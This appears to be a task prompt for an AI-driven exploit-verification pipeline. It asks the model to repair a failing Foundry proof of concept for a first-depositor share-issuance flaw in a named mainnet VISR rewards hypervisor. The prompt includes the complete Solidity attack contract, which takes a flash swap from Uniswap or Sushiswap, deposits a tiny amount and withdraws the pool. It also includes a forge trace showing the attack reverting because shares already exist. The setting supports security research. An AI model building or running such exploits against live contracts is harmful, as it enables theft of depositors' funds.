You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: The first depositor can seize any VISR already sitting in the hypervisor
- claim: When `vvisr.totalSupply() == 0`, the contract always sets `shares = visrDeposit` and skips pricing against the existing VISR balance. If VISR has been transferred into the hypervisor before the first share mint, those pre-existing assets are ignored by the initial share issuance.
- impact: The first depositor can capture all pre-seeded or accidentally transferred VISR by depositing a trivial amount, receiving 100% of the initial shares, and then withdrawing the entire pool.
- exploit_paths: ["VISR is transferred into the hypervisor before any vVISR shares exist.", "An attacker makes the first deposit with a very small `visrDeposit`.", "Because total supply is zero, the attacker receives shares 1:1 with their tiny deposit instead of against total assets.", "The attacker withdraws and receives the entire VISR balance, including the pre-existing tokens."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IRewardsHypervisorLike {
    function visr() external view returns (address);
    function vvisr() external view returns (address);
    function deposit(uint256 visrDeposit, address payable from, address to) external returns (uint256 shares);
    function withdraw(uint256 shares, address to, address payable from) external returns (uint256 rewards);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint256 private constant FLASH_BORROW_AMOUNT = 1;

    uint256 private _profitAmount;
    bool private _executed;

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        IRewardsHypervisorLike hypervisor = IRewardsHypervisorLike(TARGET);
        address visr = hypervisor.visr();
        address shareToken = hypervisor.vvisr();

        uint256 shareSupply = IERC20Like(shareToken).totalSupply();
        uint256 hypervisorVisrBalance = IERC20Like(visr).balanceOf(TARGET);
        uint256 visrBefore = IERC20Like(visr).balanceOf(address(this));

        // Path stage 1: VISR must already be sitting in the hypervisor.
        require(hypervisorVisrBalance > 0, "infeasible: hypervisor holds no VISR");

        // Path stage 2: no vVISR shares may exist yet.
        require(shareSupply == 0, "infeasible: vVISR supply already nonzero");

        uint256 localVisr = IERC20Like(visr).balanceOf(address(this));
        if (localVisr < FLASH_BORROW_AMOUNT) {
            require(
                hypervisorVisrBalance > _sameTokenRepayment(FLASH_BORROW_AMOUNT) - FLASH_BORROW_AMOUNT,
                "infeasible: preseeded VISR too small for net profit"
            );
        }

        if (localVisr >= FLASH_BORROW_AMOUNT) {
            _runDepositWithdraw(visr, FLASH_BORROW_AMOUNT);
        } else {
            address pair = _findLiquidVisrPair(visr, FLASH_BORROW_AMOUNT);

            // Minimal extra step: source the tiny first deposit amount via a real flash swap.
            // This does not change exploit causality; it only funds the required dust deposit.
            require(pair != address(0), "infeasible: no liquid VISR flash source");

            (uint256 amount0Out, uint256 amount1Out) = _outAmounts(pair, visr, FLASH_BORROW_AMOUNT);
            IUniswapV2PairLike(pair).swap(
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(visr, FLASH_BORROW_AMOUNT)
            );
        }

        uint256 visrAfter = IERC20Like(visr).balanceOf(address(this));
        if (visrAfter > visrBefore) {
            _profitAmount = visrAfter - visrBefore;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "invalid sender");

        (address visr, uint256 borrowedAmount) = abi.decode(data, (address, uint256));

        address pair = _findLiquidVisrPair(visr, borrowedAmount);
        require(msg.sender == pair, "invalid pair callback");

        uint256 received = amount0 > 0 ? amount0 : amount1;
        require(received == borrowedAmount, "unexpected borrow amount");

        _runDepositWithdraw(visr, borrowedAmount);

        uint256 repayment = _sameTokenRepayment(borrowedAmount);
        require(IERC20Like(visr).transfer(msg.sender, repayment), "repayment failed");
    }

    function profitToken() external view returns (address) {
        return IRewardsHypervisorLike(TARGET).visr();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runDepositWithdraw(address visr, uint256 depositAmount) internal {
        require(IERC20Like(visr).approve(TARGET, depositAmount), "approve failed");

        // Path stage 3: attacker makes the first deposit with a tiny VISR amount.
        uint256 mintedShares = IRewardsHypervisorLike(TARGET).deposit(
            depositAmount,
            payable(address(this)),
            address(this)
        );
        require(mintedShares == depositAmount, "unexpected first-mint shares");

        // Path stage 4: attacker withdraws the entire pool, including pre-seeded VISR.
        IRewardsHypervisorLike(TARGET).withdraw(mintedShares, address(this), payable(address(this)));
    }

    function _sameTokenRepayment(uint256 borrowedAmount) internal pure returns (uint256) {
        return ((borrowedAmount * 1000) / 997) + 1;
    }

    function _outAmounts(address pair, address visr, uint256 amountOut)
        internal
        view
        returns (uint256 amount0Out, uint256 amount1Out)
    {
        address token0 = IUniswapV2PairLike(pair).token0();
        if (token0 == visr) {
            amount0Out = amountOut;
        } else {
            amount1Out = amountOut;
        }
    }

    function _findLiquidVisrPair(address visr, uint256 minBorrow) internal view returns (address) {
        address pair;

        pair = _candidatePair(UNISWAP_V2_FACTORY, visr, WETH, minBorrow);
        if (pair != address(0)) return pair;

        pair = _candidatePair(SUSHISWAP_FACTORY, visr, WETH, minBorrow);
        if (pair != address(0)) return pair;

        pair = _candidatePair(UNISWAP_V2_FACTORY, visr, USDC, minBorrow);
        if (pair != address(0)) return pair;

        pair = _candidatePair(SUSHISWAP_FACTORY, visr, USDC, minBorrow);
        if (pair != address(0)) return pair;

        pair = _candidatePair(UNISWAP_V2_FACTORY, visr, USDT, minBorrow);
        if (pair != address(0)) return pair;

        pair = _candidatePair(SUSHISWAP_FACTORY, visr, USDT, minBorrow);
        if (pair != address(0)) return pair;

        pair = _candidatePair(UNISWAP_V2_FACTORY, visr, DAI, minBorrow);
        if (pair != address(0)) return pair;

        pair = _candidatePair(SUSHISWAP_FACTORY, visr, DAI, minBorrow);
        if (pair != address(0)) return pair;

        return address(0);
    }

    function _candidatePair(address factory, address visr, address other, uint256 minBorrow) internal view returns (address) {
        address pair = IUniswapV2FactoryLike(factory).getPair(visr, other);
        if (pair == address(0)) {
            return address(0);
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 visrReserve = token0 == visr ? uint256(reserve0) : uint256(reserve1);

        if (visrReserve <= minBorrow) {
            return address(0);
        }

        return pair;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.87s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:77:19:
   |
77 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 56256)
Traces:
  [56256] FlawVerifierTest::testExploit()
    ├─ [5595] FlawVerifier::profitToken() [staticcall]
    │   ├─ [2404] 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef::visr() [staticcall]
    │   │   └─ ← [Return] 0xF938424F7210f31dF2Aee3011291b658f872e91e
    │   └─ ← [Return] 0xF938424F7210f31dF2Aee3011291b658f872e91e
    ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2330] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [35211] FlawVerifier::executeOnOpportunity()
    │   ├─ [404] 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef::visr() [staticcall]
    │   │   └─ ← [Return] 0xF938424F7210f31dF2Aee3011291b658f872e91e
    │   ├─ [2338] 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef::vvisr() [staticcall]
    │   │   └─ ← [Return] 0x3a84aD5d16aDBE566BAA6b3DafE39Db3D5E261E5
    │   ├─ [2344] 0x3a84aD5d16aDBE566BAA6b3DafE39Db3D5E261E5::totalSupply() [staticcall]
    │   │   └─ ← [Return] 9000242001852185487035933 [9e24]
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 9219200268612237484049971 [9.219e24]
    │   ├─ [519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Revert] infeasible: vVISR supply already nonzero
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 33.27ms (1.87ms CPU time)

Ran 1 test suite in 62.19ms (33.27ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 56256)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
